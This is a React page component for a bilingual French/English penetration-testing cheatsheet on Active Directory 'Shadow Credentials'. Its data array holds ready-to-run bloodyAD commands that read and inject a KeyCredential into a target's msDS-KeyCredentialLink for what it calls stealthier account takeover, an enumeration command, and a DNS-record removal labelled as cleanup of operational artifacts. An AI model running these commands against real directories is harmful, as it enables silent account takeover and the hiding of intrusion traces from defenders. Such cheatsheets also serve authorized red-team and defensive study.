"use client";

import { useLanguage } from "@/components/LanguageProvider";
import { CheatsheetCommandCard } from "@/components/CheatsheetCommandCard";

export default function ShadowCredentialsPage() {
  const { lang } = useLanguage();
  const entries = [
    { cmd: "bloodyAD --host $DC -d $DOMAIN -u $USER -p $PASS get object '$TARGET' --attr msDS-KeyCredentialLink", why: lang === "fr" ? "Vérifier la présence de shadow credentials." : "Check for existing shadow credentials." },
    { cmd: "bloodyAD --host $DC -d $DOMAIN -u $USER -p $PASS add shadowCredentials '$TARGET'", why: lang === "fr" ? "Injecter un KeyCredential pour takeover silencieux." : "Inject a KeyCredential for stealthier takeover." },
    { cmd: "gf ldap -t $TARGET -u $USER -p $PASS --shadow-creds", why: lang === "fr" ? "Enum rapide des objets concernés." : "Quick enumeration of impacted objects." },
    { cmd: "bloodyAD --host $DC -d $DOMAIN -u $USER -p $PASS remove dnsRecord '$RECORD' '<ip>'", why: lang === "fr" ? "Exemple de cleanup d'artefact opérationnel." : "Example cleanup for operational artifact." },
  ];

  return (
    <div className="mx-auto max-w-3xl px-6 py-10 lg:px-10">
      <header className="mb-8 border-b border-border pb-6">
        <p className="mb-2 text-[11px] font-mono uppercase tracking-widest text-primary">ESC</p>
        <h1 className="text-2xl font-semibold tracking-tight text-foreground sm:text-3xl">Shadow Credentials</h1>
      </header>
      <section className="space-y-4">
        {entries.map((item) => <CheatsheetCommandCard key={item.cmd} cmd={item.cmd} why={item.why} lang={lang} />)}
      </section>
    </div>
  );
}
